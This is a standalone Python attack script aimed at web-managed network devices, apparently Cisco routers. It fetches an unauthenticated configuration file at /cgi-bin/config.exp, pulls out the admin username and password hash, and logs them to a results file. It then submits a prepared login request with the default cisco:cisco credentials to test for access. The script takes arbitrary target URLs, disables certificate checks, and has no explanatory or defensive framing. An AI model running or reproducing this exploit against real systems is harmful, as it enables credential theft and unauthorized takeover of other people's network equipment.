import sys
import re
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

url = sys.argv[1]

def getHash():
    try:
        target = requests.get(f"{url}/cgi-bin/config.exp", timeout=6, verify=False)
        if "sysconfig" in target.text:
            username = re.findall('USERNAME=(.*?)\n', target.text)
            password = re.findall('PASSWD=(.*?)\n', target.text)

            file.write("-" * 50)
            file.write(f"\r\n[*] Target: {url} \r\n")
            file.write("[+] Found Config! \r\n")
            file.write(f"[+] USERNAME: {username[0]} \r\n")
            file.write(f"[+] PASSWORD: {password[0]} (hash) \r\n")
            file.write("-" * 50)
            file.write("\r\n")
            file.close()

            print("\n")
            print(f"[*] TARGET: {url}")
            print(f"[+] USERNAME: {username[0]}")
            print(f"[+] PASSWORD: {password[0]}")
        else:
            print(f"[-] {url} Config Failed. (getHash)")
    except Exception as e:
        print(f"[-] {url} Request Failed. (getHash) \r\n")


def getUser():
    try:
        payload = {"auth_key": "1964300002",
                     "auth_server_pw": "Y2lzY28=",
                     "changelanguage": "",
                     "current_password": "",
                     "langName": "ENGLISH,Deutsch,Espanol,Francais,Italiano",
                     "LanguageList": "ENGLISH",
                     "login": "true",
                     "md5_old_pass": "",
                     "new_password": "",
                     "password": "066bae9070a9a95b3e03019db131cd40",
                     "password_expired": 0,
                     "pdStrength": 0,
                     "portalname": "CommonPortal",
                     "re_new_password": "",
                     "submitStatus": 0,
                     "username": "cisco"
                   }
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) "
                          "Chrome/92.0.4515.107 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,"
                      "*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6",
            "Connection": "close"
        }

        target = requests.post(f"{url}/cgi-bin/userLogin.cgi", data=payload, headers=headers, timeout=6, verify=False)
        if "URL=/default.htm" in target.text:
            file.write(f"[+] {url} login attempt successful! (cisco:cisco) \r\n")
            print(f"[+] {url} Login Successful! (cisco:cisco)")

            print("\r\n")
        else:
            print(f"[-] {url} Login Failed. (getUser)")
            print(target.content)
            print("\r\n")
    except Exception as e:
        print(f"[-] {url} Request Failed. (getUser) \r\n")


if __name__ == "__main__":
    file = open("result.txt", "a", encoding='utf-8')
    getHash()
    getUser()
    file.close()






